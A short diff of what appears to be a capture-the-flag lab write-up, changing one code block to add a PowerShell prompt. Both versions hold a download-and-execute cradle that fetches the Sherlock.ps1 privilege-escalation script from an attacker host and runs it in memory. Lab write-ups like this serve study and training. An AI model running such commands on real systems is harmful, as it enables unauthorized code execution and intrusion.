@@ -109,5 +109,5 @@ No useful information was found.
 ![image](https://user-images.githubusercontent.com/83878909/236176477-6d64ec41-f579-4af4-bdb5-8986fd93981f.png)
 
 ```
-IEX(New-Object Net.Webclient).downloadString('http://10.10.14.21:8000/Sherlock.ps1')
+PS C:\Users\kostas\desktop> IEX(New-Object Net.Webclient).downloadString('http://10.10.14.21:8000/Sherlock.ps1')
 ```
